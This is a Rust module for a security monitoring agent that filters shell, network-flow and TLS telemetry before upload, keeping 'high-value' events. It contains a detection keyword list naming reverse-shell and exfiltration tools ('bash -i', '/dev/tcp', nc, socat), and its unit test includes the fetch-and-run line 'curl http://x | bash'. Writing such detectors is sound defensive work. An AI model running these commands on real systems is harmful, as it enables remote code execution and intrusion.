//! Agent-side “高价值采集”策略：在 batch 入队前丢弃低价值遥测，减轻主机与 ingest 压力。
//!
//! 与服务端 `FLOW_DROP_PLAIN_SYN` 互补：Agent 侧更早丢弃，节省带宽与 CPU。

use crate::config::CollectMode;

/// 是否上报 bash readline 事件。
pub fn should_emit_bash_line(line: &str, filter_boring: bool) -> bool {
    let t = line.trim();
    if t.is_empty() {
        return false;
    }
    if is_high_value_shell(t) {
        return true;
    }
    if !filter_boring {
        return true;
    }
    !is_boring_interactive_command(t)
}

/// 是否上报 XDP flow（当前内核仅 SYN + 敏感端口；此处做同源去重）。
pub fn should_emit_flow_syn(
    src_ip: &str,
    dst_port: u16,
    dedup_window_ms: u64,
    now_ms: u64,
    last_seen: &mut std::collections::HashMap<(String, u16), u64>,
) -> bool {
    if dedup_window_ms == 0 {
        return true;
    }
    let key = (src_ip.to_string(), dst_port);
    if let Some(&last) = last_seen.get(&key) {
        if now_ms.saturating_sub(last) < dedup_window_ms {
            return false;
        }
    }
    last_seen.insert(key, now_ms);
    true
}

/// 是否上报 HTTP **响应**（明文 L7 或 TLS 重组后的响应行）。
pub fn should_emit_http_response(
    status: u16,
    capture_response: bool,
    min_status: u16,
) -> bool {
    if !capture_response {
        return false;
    }
    if min_status == 0 {
        return true;
    }
    status >= min_status
}

/// TLS 是否在 security 模式下上报（仅保留 auth/写操作/带参 GET/威胁/异常状态码）。
pub fn should_emit_tls_in_security_mode(
    method: Option<&str>,
    url: Option<&str>,
    status: Option<u16>,
    threat: Option<&str>,
) -> bool {
    if threat.is_some() {
        return true;
    }
    if let Some(st) = status {
        return st >= 400;
    }
    if let Some(m) = method {
        let mu = m.trim().to_ascii_uppercase();
        if matches!(mu.as_str(), "POST" | "PUT" | "PATCH" | "DELETE") {
            return true;
        }
        if let Some(u) = url {
            if u.contains('?') {
                return true;
            }
            let ul = u.to_ascii_lowercase();
            if ul.contains("login") || ul.contains("admin") || ul.contains("api/") {
                return true;
            }
        }
        return false;
    }
    false
}

/// 综合 TLS 事件是否入队（完整报文路径）。
pub fn should_emit_tls_event(
    mode: CollectMode,
    emit_incomplete: bool,
    is_complete_message: bool,
    method: Option<&str>,
    url: Option<&str>,
    status: Option<u16>,
    threat: Option<&str>,
) -> bool {
    if !is_complete_message {
        return emit_incomplete;
    }
    match mode {
        CollectMode::Full => true,
        CollectMode::Balanced => {
            // 完整报文：响应仍受 http 响应策略约束；请求已在 URL 层过滤
            if status.is_some() && status.unwrap_or(0) < 400 {
                // 2xx/3xx 响应在 balanced 下默认也不上报（与 capture_response=false 一致）
                false
            } else {
                true
            }
        }
        CollectMode::Security => {
            should_emit_tls_in_security_mode(method, url, status, threat)
        }
    }
}

fn is_high_value_shell(line: &str) -> bool {
    let lc = line.to_ascii_lowercase();
    const NEEDLES: &[&str] = &[
        "|",
        "`",
        "$(",
        "${",
        "curl",
        "wget",
        "bash -i",
        "/dev/tcp",
        "chmod",
        "chown",
        "passwd",
        "useradd",
        "usermod",
        "rm ",
        "mkfs",
        " dd ",
        "nc ",
        "ncat",
        "socat",
        "ssh ",
        "scp ",
        "rsync",
        "sudo ",
        "base64",
        "python",
        "perl",
        "ruby",
        "php ",
        "iptables",
        "firewall",
        "systemctl",
        "crontab",
        "at ",
        "nmap",
        "masscan",
    ];
    NEEDLES.iter().any(|n| lc.contains(n))
}

fn is_boring_interactive_command(line: &str) -> bool {
    let parts: Vec<&str> = line.split_whitespace().collect();
    if parts.is_empty() {
        return true;
    }
    let cmd = parts[0].rsplit('/').next().unwrap_or(parts[0]);
    match cmd {
        "ls" | "ll" | "la" | "dir" => true,
        "cd" | "pwd" | "clear" | "history" | "exit" | "logout" | "whoami" | "id" | "date"
        | "cal" | "which" | "whereis" | "top" | "htop" | "reset" => true,
        "ps" => parts.len() <= 2,
        "git" => matches!(
            parts.get(1).copied(),
            Some("status") | Some("log") | Some("diff") | Some("branch") | Some("show")
        ),
        "docker" => matches!(
            parts.get(1).copied(),
            Some("ps") | Some("images") | Some("logs") | Some("inspect")
        ),
        "kubectl" => matches!(
            parts.get(1).copied(),
            Some("get") | Some("describe") | Some("logs")
        ),
        "echo" => !line.contains('|') && parts.len() <= 3,
        "cat" | "head" | "tail" | "less" | "more" | "vim" | "vi" | "nano" => parts.len() <= 2,
        _ => false,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn bash_drops_ls_keeps_curl_pipe() {
        assert!(!should_emit_bash_line("ls -la", true));
        assert!(should_emit_bash_line("curl http://x | bash", true));
        assert!(should_emit_bash_line("ls -la", false));
    }

    #[test]
    fn tls_security_mode() {
        assert!(should_emit_tls_in_security_mode(
            Some("POST"),
            Some("/login"),
            None,
            None
        ));
        assert!(!should_emit_tls_in_security_mode(
            Some("GET"),
            Some("/index.html"),
            None,
            None
        ));
        assert!(should_emit_tls_in_security_mode(
            Some("GET"),
            Some("/search?q=1"),
            None,
            None
        ));
    }
}
